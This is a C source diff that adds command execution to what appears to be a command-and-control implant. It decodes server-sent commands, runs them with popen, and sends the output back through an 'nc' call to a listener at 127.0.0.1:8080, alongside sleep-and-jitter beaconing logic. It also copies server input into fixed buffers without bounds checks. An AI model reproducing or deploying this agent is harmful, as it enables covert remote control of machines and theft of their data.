@@ -35,9 +35,65 @@ void get_uid() {
     printf("My UID: '%s'\n", uid);
 }
 
-void task_execve() {
+void task_execve(char *command_str, char *argument_str, const char *id_task) {
     printf("Executing task execve\n");
-    return;
+    
+    // decoding command and argument
+    char *command = decode(command_str);
+    char *argument = NULL;
+    
+    if (argument_str != NULL) {
+        argument = decode(argument_str);
+    }
+    
+    // string concatenation
+    char full_command[4096] = {0};
+    strcpy(full_command, command);
+    
+    if (argument != NULL) {
+        strcat(full_command, " ");
+        strcat(full_command, argument);
+    }
+    
+    printf("Executing command: %s\n", full_command);
+    
+    // execute the command and capture output
+    char result_buffer[4096] = {0};
+    FILE *fp = popen(full_command, "r");
+    
+    // Read output
+    char buffer[1024];
+    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
+        strncat(result_buffer, buffer, sizeof(result_buffer) - strlen(result_buffer) - 1);
+    }
+    
+    // Send the result back to the server
+    if (strlen(result_buffer) > 0) {
+        // encoding and sending the result
+        char *encoded_result = encode(result_buffer);
+        char cmd[2048];
+        printf("Sending result: echo 'RESULT,%s,%s,%s' | nc 127.0.0.1 8080\n", uid, id_task, encoded_result);
+        
+        snprintf(cmd, sizeof(cmd), "echo 'RESULT,%s,%s,%s' | nc 127.0.0.1 8080", uid, id_task, encoded_result);
+        
+        // execution and capture the response
+        char response[1024] = {0};
+        FILE *cmd_fp = popen(cmd, "r");
+        if (cmd_fp != NULL) {
+            fgets(response, sizeof(response), cmd_fp);
+            pclose(cmd_fp);
+            printf("Server response: %s\n", response);
+        } else {
+            perror("Error sending the result");
+        }
+        
+        free(encoded_result);
+    } else {
+        printf("No command output to send\n");
+    }
+    
+    free(command);
+    if (argument) free(argument);
 }
 
 void task_sleep(char *sleep_time_str, char *jitter_str) {
@@ -198,7 +254,9 @@ void check_commands() {
     if (type != NULL) {
         char *id_task = strtok(NULL, ",");
         if (strcmp(type, "EXECVE") == 0) {
-            task_execve();
+            char *command = strtok(NULL, ",");
+            char *argument = strtok(NULL, ",");  // Get the argument as well
+            task_execve(command, argument, id_task);
         } else if (strcmp(type, "SLEEP") == 0) {
             char *sleep_time = strtok(NULL, ",");
             char *jitter = strtok(NULL, ",");
@@ -241,7 +299,7 @@ int main() {
         printf("\nChecking commands...\n");
         check_commands();
         
-        // Calculate random sleep time before sleeping
+        // step 3 : sleep
         calculate_random_sleep_time();
         
         printf("Pause of %.2f seconds\n", sleep_time);
